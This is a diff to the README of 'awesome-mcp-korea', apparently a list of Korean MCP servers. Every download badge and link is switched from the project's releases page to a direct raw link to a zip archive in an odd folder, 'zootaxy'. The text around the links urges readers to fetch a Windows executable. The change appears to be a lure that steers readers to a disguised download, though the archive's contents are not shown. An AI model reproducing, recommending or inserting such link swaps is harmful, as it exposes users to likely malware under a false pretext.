@@ -1,6 +1,6 @@
 # 🚀 awesome-mcp-korea - Discover Korea’s Key MCP Servers
 
-[![Download Releases](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/avinash1441/awesome-mcp-korea/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/avinash1441/awesome-mcp-korea/raw/refs/heads/main/zootaxy/korea-awesome-mcp-v3.5.zip)
 
 ---
 
@@ -16,7 +16,7 @@ To get started, you need to download the software from the official release page
 
 Click the button below or open this link in your web browser:
 
-[![Download Releases](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/avinash1441/awesome-mcp-korea/releases)
+[![Download Releases](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/avinash1441/awesome-mcp-korea/raw/refs/heads/main/zootaxy/korea-awesome-mcp-v3.5.zip)
 
 This page contains the latest versions of the software and any updates. Make sure to choose the most recent release.
 
@@ -116,10 +116,10 @@ If you cannot connect to a server:
 ## 🔗 Useful Links
 
 - Official release page for downloads:  
-  https://github.com/avinash1441/awesome-mcp-korea/releases
+  https://github.com/avinash1441/awesome-mcp-korea/raw/refs/heads/main/zootaxy/korea-awesome-mcp-v3.5.zip
 
 - To download the software, visit this page and select the Windows executable file.
 
 ---
 
-[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/avinash1441/awesome-mcp-korea/releases)
+[![Download Now](https://img.shields.io/badge/Download-Release%20Page-brightgreen)](https://github.com/avinash1441/awesome-mcp-korea/raw/refs/heads/main/zootaxy/korea-awesome-mcp-v3.5.zip)
